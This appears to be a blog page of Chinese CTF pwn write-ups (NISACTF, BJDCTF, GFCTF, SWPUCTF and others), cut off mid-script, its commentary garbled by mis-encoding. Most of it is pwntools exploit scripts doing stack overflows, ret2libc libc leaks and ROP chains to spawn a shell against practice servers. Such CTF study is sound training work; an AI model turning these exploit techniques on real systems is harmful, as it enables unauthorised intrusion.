&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28867)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x400726)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name:&amp;#x27;,&amp;#x27;-1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022reorpwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022reorpwn&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ReorPwn?&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜æ³¨æ„ä»–çš„ fun å‡½æ•°é‡Œé¢ç»™ä½ çš„é¡ºåºé€†äº†ä¸€ä¸‹ï¼Œä¸‹é¢å°±æ˜¯ systemï¼Œé‚£ç›´æ¥ä½¿ç”¨ payload æ•°ç»„é€†ä½ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28301)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;comm=&amp;#x27;cat /flag&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=comm[::-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lleT:&amp;#x27;,a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babystack&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babystack&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babystack&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜å°±æ›´ç®€å•äº†ï¼Œåƒå‰é¢é‚£ä¸ªé¢˜ï¼Œè¿™ä¸ªé¢˜è¿˜ä¸éœ€è¦åˆ¤æ–­ read çš„é•¿åº¦éšä¾¿è¾“å°±è¡Œèƒ½è¾¾åˆ°æº¢å‡ºç‚¹å°±è¡Œ&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28240)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x18+p64(0x4006E6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name:&amp;#x27;,&amp;#x27;-1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022ezstack&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022ezstack&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ezstack&lt;/h5&gt;
&lt;p&gt;æ‰“å¼€åç”¨ ida æŸ¥çœ‹åˆ°ä»£ç é‡Œé¢æ²¡æœ‰ system (&#39;/bin/sh&#39;) ä½†æ˜¯æœ‰ system å¹¶ä¸”åœ¨ data æ®µé‡Œé¢æœ‰ /bin/sh é‚£æˆ‘ä»¬ç›´æ¥è®©ä»£ç æº¢å‡ºè°ƒç”¨ system å’Œ /bin/sh&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28961)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x48+0x4)+p32(0x08048512)+p32(0x804A024)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;NISACTF&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;watevrctf-2019voting-machine-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#watevrctf-2019voting-machine-1&#34;&gt;#&lt;/a&gt; [watevrCTF 2019]Voting Machine 1&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜æœ‰ä¸¤ä¸ªè§£æ³•ï¼Œè¾“å…¥ 0x2 æˆ–è€… 0xa&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;machine&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28788)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p=process(&amp;#x27;./ctf&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0xa)+p64(0x400807)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;quot;Vote:&amp;quot;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022ezpie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022ezpie&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ezpie&lt;/h5&gt;
&lt;p&gt;è¿™ç§é¢˜è¦æ³¨æ„æµç¨‹åŒ–ï¼Œå…ˆçœ‹å› ä¸ºå¼€å¯äº† pie åœ°å€éšæœºåŒ–å°±å¾—å»ç®—ä»–ä»¬çš„åç§»é‡å› ä¸ºå¾—åˆ°äº† main å‡½æ•°åœ°å€æ‰€ä»¥å°±ç›´æ¥æ„é€ &lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28694)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell=elf.sym[&amp;#x27;shell&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset=shell-main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;offset is :%x&amp;#x27;%offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;gift!\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_addr=int(p.recv(10).decode(),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_shell_addr=main_addr+offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;main_addr is %x&amp;#x27;%main_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;shelloffset is %x&amp;#x27;%p_shell_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x28+0x4)+p32(p_shell_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;Input:&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;2021-é¹¤åŸæ¯babyof&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2021-é¹¤åŸæ¯babyof&#34;&gt;#&lt;/a&gt; [2021 é¹¤åŸæ¯] babyof&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ª ret2libc çš„é¢˜é¦–å…ˆè¦æ³„éœ²å‡ºä¸€ä¸ª libc åŸºåœ°å€ç„¶åæ‰èƒ½å¾—åˆ°å…¶ä»–çš„åœ°å€&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;quot;debug&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;program = &amp;quot;./babyof&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28666)#process(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = 0x400743&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ret = 0x400506&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__start = 0x400550&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*(0x40+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) #//è·³è½¬åˆ°rdiå¯„å­˜å™¨ä¸Šé¢ç„¶ååœ¨é€šè¿‡putså‡½æ•°æ¥æ‰“å°putsçš„gotåœ¨é€šè¿‡retåˆ°èµ·å§‹ä½ç½®è®©ä¸‹é¢çš„payloadç”Ÿæ•ˆ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;quot;Do you know how to do buffer overflow?\n&amp;quot;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;quot;I hope you win\n&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = u64(p.recvuntil(&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))  #\\æ¥æ”¶putsçš„gotåœ°å€å› ä¸ºæ ˆåœ°å€ä¸€èˆ¬æ˜¯ç”±\x7få¼€å¤´çš„è‡ªåŠ¨è¡¥å…¨8ä½&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts addr is %x&amp;#x27;%puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_addr) #\\åˆ©ç”¨puts_addråœ¨LibcSearcheré‡Œé¢æŸ¥æ‰¾å¯¹æ˜ çš„åº“&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = puts_addr-libc.dump(&amp;#x27;puts&amp;#x27;)  #\\åˆ©ç”¨puts_addrï¼ˆåŠ¨æ€åœ°å€ï¼‰å‡å»putsçš„å‡½æ•°åç§»é‡å³å¯å¾—åˆ°libcçš„åŸºåœ°å€&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh_str=libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;) #\\ä¸‹é¢çš„å¾—åˆ°åŸºåœ°å€åéƒ½åŠ ä¸Šåç§»é‡å°±èƒ½å¾—åˆ°å¯¹åº”çš„å‡½æ•°äº†&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;libc addr is %x&amp;#x27;%libc_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;bin_sh_str is %x&amp;#x27;%bin_sh_str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = b&amp;#x27;a&amp;#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\ä½¿ç”¨ä¸€ä¸ªretæ¥è·³è½¬åˆ°pop_rdiç„¶åå°±åˆ©ç”¨system(/bin/sh)å³å¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;quot;Do you know how to do buffer overflow?\n&amp;quot;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gfctf-2021where_is_shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gfctf-2021where_is_shell&#34;&gt;#&lt;/a&gt; [GFCTF 2021]where_is_shell&lt;/h5&gt;
&lt;p&gt;å¯ä»¥åˆ©ç”¨ system ($0) è·å¾— shell æƒé™ï¼Œ$0 åœ¨æœºå™¨ç ä¸­ä¸º \x24\x30&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./shell&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local = 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if local ==0:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p = process(&amp;#x27;./shell&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28616)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret_addr = 0x400416 # ROPgadget --binary shell --only &amp;#x27;ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi_ret = 0x4005e3 # ROPgadget --binary shell --only &amp;#x27;pop|rdi|ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tips = 0x400541&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = elf.symbols[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;b&amp;#x27;*0x10+b&amp;#x27;b&amp;#x27;*8+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;find it?\n&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2021-æ–°ç”Ÿèµ›whitegive_pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2021-æ–°ç”Ÿèµ›whitegive_pwn&#34;&gt;#&lt;/a&gt; [SWPUCTF 2021 æ–°ç”Ÿèµ›] whitegive_pwn&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜çš„è¯å’Œ babyof çš„é¢˜å·®ä¸å¤šå°±æ˜¯ä¸€ä¸ª ret2libc çš„é¢˜ä½†æ˜¯è¿™ä¸ªé¢˜çš„ libc.so æœ‰é—®é¢˜æ‰“ä¸è¿›å»ä»£ç å¦‚ä¸‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 